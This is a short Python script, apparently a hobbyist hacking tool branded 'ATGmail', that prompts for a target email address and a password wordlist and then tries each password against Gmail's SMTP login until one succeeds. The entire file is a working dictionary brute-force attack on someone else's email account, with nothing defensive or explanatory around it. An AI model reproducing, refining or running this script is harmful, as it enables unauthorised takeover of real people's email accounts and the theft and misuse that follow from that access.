import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print('''
                      ___ _____                     _ _ 
                     / _ \_   _|                   (_) |
                    / /_\ \| | __ _ _ __ ___   __ _ _| |
                    |  _  || |/ _` | '_ ` _ \ / _` | | |
                    | | | || | (_| | | | | | | (_| | | |
                    \_| |_/\_/\__, |_| |_| |_|\__,_|_|_|
                               __/ |                    
                              |___/      
                       ATGmail Programming by ./root
                      -------------------------------
                 https://www.facebook.com/haitem.aouati.dz						  
''')
user = raw_input("\033[94m [>] Enter the target Email >>> ")
passwfile = raw_input ("\033[94m [>] Enter password list >>>")
passwfile = open(passwfile, "r")

for password in passwfile :
        try :
                smtpserver.login(user, password)
                print ("\033[92m [+] Password Found --> %s") % password
                break;
        except smtplib.SMTPAuthenticationError:
                print ("\033[91m [-] Password is incorrect ---> %s ") % password              
